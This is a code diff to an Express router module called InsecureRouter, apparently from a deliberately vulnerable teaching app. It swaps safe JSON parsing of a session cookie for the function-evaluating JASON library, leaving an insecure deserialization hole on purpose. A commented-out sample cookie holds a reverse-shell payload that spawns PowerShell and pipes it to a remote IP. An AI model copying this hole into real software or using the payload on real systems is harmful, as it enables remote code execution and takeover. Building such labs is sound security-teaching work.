@@ -1,11 +1,12 @@
 import express, {Request, Response} from "express";
 import _ from "lodash";
 import {getUserData} from "../application/database";
+const JASON = require('JASON');
 
 export module InsecureRouter {
 
     const router = express.Router();
-    const JASON = require('JASON')
+
 
     /** example endpoint for insecure deserialization:
      * GET userProfile returns the profile of the user based on the (insecure) session cookie.
@@ -21,10 +22,8 @@ export module InsecureRouter {
         }
 
         const parsedCookie = Buffer.from(cookie, 'base64').toString('ascii');
-
-        //TODO: make it insecure
-        const obj = JSON.parse(parsedCookie);
-        console.log(obj)
+        //let parsedCookie = "{\"p1\": foo=function(){let sh = child_process.spawn('powershell.exe');\nlet client = new net.Socket(); client.connect(8080, \"192.168.0.197\", function(){client.pipe(sh.stdin);sh.stdout.pipe(net.client);sh.stderr.pipe(net.client); return /a/})},\"p2\":foo()}"
+        const obj = JASON.parse(parsedCookie);
 
         const userData = getUserData(obj.id);
 
